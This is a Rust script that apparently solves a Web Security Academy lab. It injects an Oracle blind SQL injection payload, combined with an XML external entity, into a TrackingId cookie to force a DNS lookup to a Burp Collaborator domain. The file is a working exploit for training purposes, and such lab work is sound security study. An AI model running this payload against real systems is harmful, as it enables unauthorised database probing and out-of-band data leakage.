/***********************************************************************
*
* Lab: Blind SQL injection with out-of-band interaction
*
* Hack Steps: 
*      1. Inject payload into 'TrackingId' cookie to make a DNS lookup
*         to your burp collaborator domain
*      2. Check your collaborator for incoming traffic
*
************************************************************************/
use reqwest::{
    blocking::{Client, ClientBuilder, Response},
    redirect::Policy,
};
use std::{
    io::{self, Write},
    time::Duration,
};
use text_colorizer::Colorize;

// Change this to your lab URL
const LAB_URL: &str = "https://0a6900a304ce6cfb82f8d0c7003d0084.web-security-academy.net";

// Change this to your burp collaborator domain
const BURP_COLLABORATOR: &str = "wrrnspxgnwjsdqhm4txiyp5dc4iv6lua.oastify.com";

fn main() {
    println!("⦗#⦘ Injection point: {}", "TrackingId".yellow());
    print!("❯❯ Injecting payload to make DNS lookup.. ");
    io::stdout().flush().unwrap();

    let payload = format!("'||(SELECT EXTRACTVALUE(xmltype('<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE root [ <!ENTITY %25 remote SYSTEM \"http://{BURP_COLLABORATOR}/\"> %25remote%3b]>'),'/l') FROM dual)-- -");
    fetch_with_cookie("/filter?category=Pets", &payload);

    println!("{}", "OK".green());
    println!("🗹 Check the DNS lookup in your burp collaborator");
    println!("🗹 The lab should be marked now as {}", "solvd".green())
}

fn build_web_client() -> Client {
    ClientBuilder::new()
        .redirect(Policy::none())
        .connect_timeout(Duration::from_secs(5))
        .build()
        .unwrap()
}

fn fetch_with_cookie(path: &str, cookie: &str) -> Response {
    let client = build_web_client();
    client
        .get(format!("{LAB_URL}{path}"))
        .header("Cookie", format!("TrackingId={cookie}"))
        .send()
        .expect(&format!("⦗!⦘ Failed to fetch: {}", path.red()))
}
